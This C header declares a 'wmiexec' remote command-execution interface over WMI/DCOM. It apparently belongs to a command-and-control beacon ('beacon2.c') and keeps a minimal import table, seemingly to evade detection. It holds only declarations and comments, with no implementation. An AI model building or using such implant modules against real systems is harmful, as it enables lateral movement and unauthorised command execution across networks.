/*
 * csdev :: wmi.h  --  native wmiexec interface
 * ==========================================================================
 * Implementation in wmi.c. Every COM entry point (ole32 / oleaut32 / mpr) is
 * resolved at runtime, so the static import table stays
 * {ADVAPI32, KERNEL32, msvcrt, WINHTTP} -- the project hard rule.
 * ==========================================================================
 */
#ifndef CSDEV_WMI_H
#define CSDEV_WMI_H

/* Execute a command on a remote (or local) host through WMI/DCOM:
 *   IWbemLocator -> IWbemServices -> ExecMethod("Win32_Process","Create")
 *
 * host    target, e.g. "10.0.0.5" or "127.0.0.1"
 * user    NULL / "" for the current process identity
 * domain  NULL / "" when the user is not domain qualified
 * pass    NULL / "" for the current process identity
 * cmd     command line passed to cmd.exe /Q /c on the target
 *
 * Returns the number of bytes written into out. Never returns 0 on a valid
 * call (a status line is always emitted).
 */
unsigned int ops_wmiexec(const char *host, const char *user, const char *domain,
                         const char *pass, const char *cmd,
                         unsigned char *out, unsigned int cap);

/* Command line form, parsed inside the module:
 *   [-u user] [-p pass] [-d domain] <host> <cmd>
 * Used by the CMD_NET_OPS dispatcher in beacon2.c. */
unsigned int ops_wmiexec_cmdline(const char *args, unsigned char *out, unsigned int cap);

#endif /* CSDEV_WMI_H */
